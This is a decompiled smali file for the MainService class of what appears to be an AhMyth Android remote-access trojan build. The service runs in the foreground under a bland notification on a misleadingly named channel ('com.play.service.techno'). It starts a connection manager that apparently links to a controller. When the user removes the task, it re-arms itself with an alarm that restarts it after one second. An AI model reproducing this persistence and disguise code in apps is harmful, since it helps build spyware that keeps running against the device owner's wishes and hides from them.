.class public Lahmyth/mine/king/ahmyth/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field static final synthetic $assertionsDisabled:Z

.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    .line 20
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 23
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 24
    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 58
    sget-object v0, Lahmyth/mine/king/ahmyth/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method

.method private startMyOwnForeground()V
    .locals 8

    .line 83
    const-string v0, "com.play.service.techno"

    .line 84
    .local v0, "NOTIFICATION_CHANNEL_ID":Ljava/lang/String;
    const-string v1, "My Background Service"

    .line 85
    .local v1, "channelName":Ljava/lang/String;
    new-instance v2, Landroid/app/NotificationChannel;

    const/4 v3, 0x0

    invoke-direct {v2, v0, v1, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 86
    .local v2, "chan":Landroid/app/NotificationChannel;
    const v4, -0xffff01

    invoke-virtual {v2, v4}, Landroid/app/NotificationChannel;->setLightColor(I)V

    .line 87
    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 88
    const-string v3, "notification"

    invoke-virtual {p0, v3}, Lahmyth/mine/king/ahmyth/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/NotificationManager;

    .line 89
    .local v3, "manager":Landroid/app/NotificationManager;
    if-eqz v3, :cond_0

    .line 90
    invoke-virtual {v3, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 92
    new-instance v4, Landroid/support/v4/app/NotificationCompat$Builder;

    invoke-direct {v4, p0, v0}, Landroid/support/v4/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 93
    .local v4, "notificationBuilder":Landroid/support/v4/app/NotificationCompat$Builder;
    const/4 v5, 0x1

    invoke-virtual {v4, v5}, Landroid/support/v4/app/NotificationCompat$Builder;->setOngoing(Z)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v6

    .line 94
    const-string v7, "App is running in background"

    invoke-virtual {v6, v7}, Landroid/support/v4/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v6

    .line 95
    invoke-virtual {v6, v5}, Landroid/support/v4/app/NotificationCompat$Builder;->setPriority(I)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v6

    .line 96
    const-string v7, "service"

    invoke-virtual {v6, v7}, Landroid/support/v4/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v6

    .line 97
    invoke-virtual {v6}, Landroid/support/v4/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v6

    .line 98
    .local v6, "notification":Landroid/app/Notification;
    invoke-virtual {p0, v5, v6}, Lahmyth/mine/king/ahmyth/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 99
    return-void

    .line 89
    .end local v4    # "notificationBuilder":Landroid/support/v4/app/NotificationCompat$Builder;
    .end local v6    # "notification":Landroid/app/Notification;
    :cond_0
    new-instance v4, Ljava/lang/AssertionError;

    invoke-direct {v4}, Ljava/lang/AssertionError;-><init>()V

    throw v4
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 30
    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 0

    .line 52
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 53
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3
    .param p1, "paramIntent"    # Landroid/content/Intent;
    .param p2, "paramInt1"    # I
    .param p3, "paramInt2"    # I

    .line 38
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/4 v1, 0x1

    const/16 v2, 0x1a

    if-lt v0, v2, :cond_0

    .line 39
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/MainService;->startMyOwnForeground()V

    goto :goto_0

    .line 42
    :cond_0
    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, v1, v0}, Lahmyth/mine/king/ahmyth/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 45
    :goto_0
    sput-object p0, Lahmyth/mine/king/ahmyth/MainService;->contextOfApplication:Landroid/content/Context;

    .line 46
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 47
    return v1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 5
    .param p1, "rootIntent"    # Landroid/content/Intent;

    .line 63
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 67
    nop

    .line 68
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    .line 70
    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/MainService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lahmyth/mine/king/ahmyth/MainService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 67
    const/16 v2, 0x3e9

    const/high16 v3, 0x40000000    # 2.0f

    invoke-static {v0, v2, v1, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 73
    .local v0, "service":Landroid/app/PendingIntent;
    const-string v1, "alarm"

    invoke-virtual {p0, v1}, Lahmyth/mine/king/ahmyth/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/AlarmManager;

    .line 74
    .local v1, "alarmManager":Landroid/app/AlarmManager;
    const/4 v2, 0x2

    const-wide/16 v3, 0x3e8

    invoke-virtual {v1, v2, v3, v4, v0}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 76
    return-void
.end method
